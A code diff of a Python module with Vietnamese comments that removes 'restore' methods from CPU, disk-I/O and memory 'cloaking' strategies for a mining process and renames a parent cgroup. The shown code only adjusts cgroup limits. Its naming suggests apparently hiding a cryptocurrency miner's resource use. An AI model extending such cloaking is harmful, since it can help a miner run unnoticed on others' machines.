@@ -31,17 +31,6 @@ class CloakStrategy(ABC):
         """
         pass
 
-    @abstractmethod
-    def restore(self, process: MiningProcess, original_limits: Dict[str, Any]) -> None:
-        """
-        Khôi phục lại các giới hạn tài nguyên ban đầu cho tiến trình đã cho.
-
-        Args:
-            process (MiningProcess): Đối tượng tiến trình.
-            original_limits (Dict[str, Any]): Dictionary chứa các giới hạn tài nguyên ban đầu.
-        """
-        pass
-
 
 class CpuCloakStrategy(CloakStrategy):
     """
@@ -100,8 +89,8 @@ class CpuCloakStrategy(CloakStrategy):
                     self.logger.error(f"Không thể tạo cgroup CPU '{cpu_cgroup}' cho tiến trình {process_name} (PID: {pid}).")
                     return
 
-                # Thêm cgroup CPU vào cgroup cha 'root'
-                parent_cgroup = "root"
+                # Thêm cgroup CPU vào cgroup cha 'root_cpu'
+                parent_cgroup = "root_cpu"
                 success = self.cgroup_manager.add_cgroup_to_parent(parent_cgroup, cpu_cgroup)
                 if not success:
                     self.logger.error(f"Không thể thêm cgroup CPU '{cpu_cgroup}' vào cgroup cha '{parent_cgroup}'.")
@@ -757,51 +746,6 @@ class DiskIoCloakStrategy(CloakStrategy):
             )
             raise
 
-    def restore(self, process: MiningProcess, original_limits: Dict[str, Any]) -> None:
-        """
-        Khôi phục lại các giới hạn Disk I/O ban đầu cho tiến trình đã cho.
-
-        Args:
-            process (MiningProcess): Đối tượng tiến trình.
-            original_limits (Dict[str, Any]): Dictionary chứa các giới hạn Disk I/O ban đầu.
-        """
-        try:
-            pid = process.pid
-            process_name = process.name
-
-            io_cgroup = original_limits.get('cgroup')
-            original_io_weight = original_limits.get('io_weight')
-
-            if not io_cgroup:
-                self.logger.error(f"Không có thông tin cgroup I/O để khôi phục cho tiến trình {process_name} (PID: {pid}).")
-                return
-
-            # Khôi phục I/O weight thông qua DiskIOResourceManager
-            if original_io_weight:
-                success = self.disk_io_resource_manager.set_io_weight(io_cgroup, original_io_weight)
-                if success:
-                    self.logger.info(
-                        f"Khôi phục I/O weight là {original_io_weight} cho tiến trình {process_name} (PID: {pid}) trong cgroup '{io_cgroup}'."
-                    )
-                else:
-                    self.logger.error(
-                        f"Không thể khôi phục I/O weight là {original_io_weight} cho tiến trình {process_name} (PID: {pid}) trong cgroup '{io_cgroup}'."
-                    )
-
-            # Xóa cgroup I/O nếu cần
-            self.cgroup_manager.delete_cgroup(io_cgroup)
-            self.logger.info(f"Đã xóa cgroup I/O '{io_cgroup}' cho tiến trình {process_name} (PID: {pid}).")
-
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại khi khôi phục Disk I/O: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền để khôi phục cloaking Disk I/O cho PID {process.pid}: {e}")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi khi khôi phục cloaking Disk I/O cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            raise
-
     def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
         """
         Lấy PID và tên tiến trình từ đối tượng process.
@@ -1071,51 +1015,6 @@ class MemoryCloakStrategy(CloakStrategy):
         except Exception as e:
             self.logger.error(
                 f"Lỗi bất ngờ khi áp dụng cloaking Memory cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            raise
-
-    def restore(self, process: MiningProcess, original_limits: Dict[str, Any]) -> None:
-        """
-        Khôi phục lại các giới hạn Memory ban đầu cho tiến trình đã cho.
-
-        Args:
-            process (MiningProcess): Đối tượng tiến trình.
-            original_limits (Dict[str, Any]): Dictionary chứa các giới hạn Memory ban đầu.
-        """
-        try:
-            pid = process.pid
-            process_name = process.name
-
-            memory_cgroup = original_limits.get('cgroup')
-            original_memory_limit_bytes = original_limits.get('memory_limit_bytes')
-
-            if not memory_cgroup:
-                self.logger.error(f"Không có thông tin cgroup Memory để khôi phục cho tiến trình {process_name} (PID: {pid}).")
-                return
-
-            # Khôi phục giới hạn bộ nhớ thông qua MemoryResourceManager
-            if original_memory_limit_bytes:
-                success = self.memory_resource_manager.set_memory_limit(memory_cgroup, original_memory_limit_bytes)
-                if success:
-                    self.logger.info(
-                        f"Khôi phục giới hạn bộ nhớ thành {original_memory_limit_bytes} bytes cho tiến trình {process_name} (PID: {pid}) trong cgroup '{memory_cgroup}'."
-                    )
-                else:
-                    self.logger.error(
-                        f"Không thể khôi phục giới hạn bộ nhớ cho tiến trình {process_name} (PID: {pid}) trong cgroup '{memory_cgroup}'."
-                    )
-
-            # Xóa cgroup Memory nếu cần
-            self.cgroup_manager.delete_cgroup(memory_cgroup)
-            self.logger.info(f"Đã xóa cgroup Memory '{memory_cgroup}' cho tiến trình {process_name} (PID: {pid}).")
-
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại khi khôi phục Memory: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền để khôi phục cloaking Memory cho PID {process.pid}: {e}")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi bất ngờ khi khôi phục cloaking Memory cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
             )
             raise
 
